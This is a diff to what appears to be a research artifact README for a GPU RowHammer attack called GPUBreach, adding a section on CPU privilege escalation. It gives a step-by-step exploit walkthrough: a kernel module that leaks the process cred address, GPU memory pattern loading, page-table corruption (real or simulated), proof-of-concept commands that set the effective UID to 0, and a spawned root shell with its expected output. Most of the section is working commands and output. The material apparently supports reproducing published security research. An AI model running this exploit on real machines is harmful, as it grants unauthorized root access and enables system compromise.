@@ -177,6 +177,182 @@ GPU privilege escalation is successful if the results in `results/gpubreach_demo
 
 ### 3. CPU Privilege Escalation (Section 6.4)
 
+This step achieves an arbitrary write primitive from user space to the CPU's kernel memory, assuming IOMMU protection is enabled. The attacker tampers with the metadata in the CPU-side DMA region, causes a buffer overflow in the GPU driver, and overwrites the adjacent buffer protected by the IOMMU. Then, the attacker uses the arbitrary write primitive in the kernel space to overwrite the `euid` of the current process to 0, and spawns a root shell.
+
+Our evaluation has the following CPU-side configuration:
+
+```
+Architecture:            x86_64
+  CPU op-mode(s):        32-bit, 64-bit
+  Address sizes:         48 bits physical, 48 bits virtual
+  Byte Order:            Little Endian
+CPU(s):                  24
+  On-line CPU(s) list:   0-23
+Vendor ID:               AuthenticAMD
+  Model name:            AMD Ryzen Threadripper PRO 5945WX 12-Cores
+    CPU family:          25
+    Model:               8
+    Thread(s) per core:  2
+    Core(s) per socket:  12
+    Socket(s):           1
+    Stepping:            2
+NUMA:
+  NUMA node(s):          1
+  NUMA node0 CPU(s):     0-23
+```
+
+#### Step 0: Preparations
+
+##### Build and load the credential structure dumping module
+
+This step provides the service of getting the address of the `cred` structure, derived from the assumption that a process's `cred` data structure can be leaked via other side-channels.
+
+```bash
+$ cd open-gpu-kernel-modules/cred_mod/
+$ make
+$ sudo insmod get_cred_addr.ko
+```
+
+---
+
+#### Step 1: Generate Memory Pattern
+
+Create a 1GB pattern file that will be used to fill GPU memory:
+
+```bash
+$ cd d2h-tools/
+$ ./create_d_pattern.py --size 1GB --output d_pattern.bin
+```
+
+---
+
+#### Step 2: Load Pattern to GPU Memory
+
+Build the memory operator and load the pattern:
+
+```bash
+$ cd d2h-tools/mem-operator/
+$ make -j
+$ cd ..
+$ ./mem-operator/mem-operator ./d_pattern.bin  # Run this command as-is as a regular user with GPU access (non-root). The exploit will later escalate privileges to root.
+```
+
+This `mem-operator` will:
+- Allocate a 1GB buffer on the GPU
+- Fill it with the pattern from Step 1
+- Open an interactive command prompt for later steps
+
+**Wait until a '>' appears, indicating that the prompt is ready, and keep this terminal open** - you will need it in the step of executing privilege escalation.
+
+---
+
+#### Step 3: Get the GPU Pointer to the CPU side DMA buffer
+
+If you just want to verify the exploit without running the GPU RowHammer part (Case 1), we provide a set of utilities to simulate its effect. Otherwise, you can follow Case 2 below to do it end-to-end.
+
+##### Case 1: If you want to just verify the CPU-side privilege escalation
+
+
+- Check dmesg for the IOVA values.
+
+```bash
+$ sudo dmesg | grep “IOVA (GPU view)”  # for GPU’s IOVA
+```
+
+Note that this value is stable across runnings and machines, always 0xffe41000 or 0xfff41000.
+
+Then edit the simulate_rowhammer.sh script:
+First zero out the last 20 bit of IOVA(GPU view) and set it to IOVA_BASE.  
+
+e.g.  `IOVA_BASE="0xfff00000"` or `IOVA_BASE="0xffe00000"`.
+Then run the script to simulate rowhammer behaviour using sudo. 
+
+```bash
+cd d2h-tools/scripts/
+sudo ./simulate_rowhammer.sh
+``` 
+
+---
+Now you are ready to move on to Step 4.
+
+
+#### Case 2: If you want to do the end-to-end exploit
+
+First execute the GPUBreach program design for CPU-side exploit:
+```bash
+python3 gpubreach.py app_cpu_exploit --n_step1 24109 --n_step3 24070 -t 0.2 -s 15
+```
+
+When corruption is successful, the program will pause and you will see text like so:
+```text
+(Stable Primitive Ready) Start mem_operator now. It should load its page with 0x6464646464646464.
+Press Enter Key to start finding and modifying that page's PTE.
+```
+
+As instructed, on another terminal, you will execute:
+```bash
+./mem-operator/mem-operator ./d_pattern.bin
+```
+
+Once the terminal appears, it means the data has been loaded. Now go back to GPUBreach’s terminal and **Press Enter Key**. On success, GPUBreach will print the text below and exit:
+```text
+Found its PTE, modified your pointer's PTE to point to: 0x060000000fff0005
+```
+
+Now you are ready to move on to Step 4.
+
+---
+
+#### Step 4: Execute Privilege Escalation
+
+In the command prompt that opened in Step 2, run the following application commands step by step. Note that `>` means that these commands are run in the GPU memory operator's command prompt, not the regular shell.
+
+```bash
+> poc-init
+> poc-cw-entry0-checksum
+> poc-privesc
+> poc-trigger 5
+```
+
+#### Step 5: Verify privilege escalation
+
+You should return to the GPU memory operator's  command prompt. Check your privileges:
+
+```bash
+> whoami
+```
+
+**Expected output:**
+```
+User identity check:
+  Real UID:      1000 (this is your original UID, which might differ from this)
+  Effective UID: 0
+```
+
+The effective UID of 0 indicates successful privilege escalation to root.
+
+If the Effective UID is not 0, the exploit has failed. You can try to execute `poc-trigger 5` again. If still unsuccessful, you may need to reboot the machine using out-of-band methods and restart the exploit.
+
+### 6.5 Spawn root shell
+
+If the previous step has succeeded, use the `fork` command to spawn a root shell:
+
+```bash
+> fork
+```
+
+**Expected output:**
+```
+In child process (PID: XXXX)
+Effective UID: 0
+# whoami 
+root
+# id
+uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin)
+```
+
+You now have a root shell while starting as a regular user.
+
 
 ### Debugging Tips
 
